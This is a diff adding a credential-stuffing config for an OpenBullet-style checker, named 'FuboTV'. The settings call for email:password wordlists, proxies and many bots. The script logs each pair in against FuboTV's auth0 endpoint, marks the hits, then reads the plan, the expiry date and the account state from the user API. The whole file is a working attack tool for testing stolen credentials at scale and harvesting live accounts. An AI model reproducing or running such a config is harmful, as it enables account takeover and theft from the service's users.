@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "FuboTV",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-31T17:55:33.8560993+02:00",
+  "AdditionalInfo": "",
+  "Author": "INFINTEY",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://fubo.auth0.com/oauth/ro" 
+  CONTENT "{\"client_id\":\"d6YiOzgcOnC305cKkBZoydAu62K1z7Ly\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"scope\":\"openid user offline_access\",\"connection\":\"Username-Password-Authentication\",\"device\":\"web\",\"grant_type\":\"password\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.fubo.tv" 
+  HEADER "Referer: https://www.fubo.tv/welcome" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"invalid_user_password" 
+    KEY "\":\"Wrong email or password.\"}" 
+  KEYCHAIN Success OR 
+    KEY "\",\"token_type\":\"bearer\"}" 
+
+#Token PARSE "<SOURCE>" LR "{\"id_token\":\"" "\"" -> VAR "Token" 
+
+REQUEST GET "https://api.fubo.tv/user" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: <Token>" 
+
+#uuid PARSE "<SOURCE>" LR "uuid\":\"" "\"" -> VAR "uuid" 
+
+#Plan PARSE "<SOURCE>" LR "plan_slug\":\"" "\"" -> CAP "Plan" 
+
+#Expires PARSE "<SOURCE>" LR "current_period_ends_at\":\"" "\"" -> CAP "Expires" 
+
+#Account PARSE "<SOURCE>" LR "uuid\":\"<uuid>\",\"state\":\"" "\"" -> CAP "Account" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "activated_at\":\"" 
+
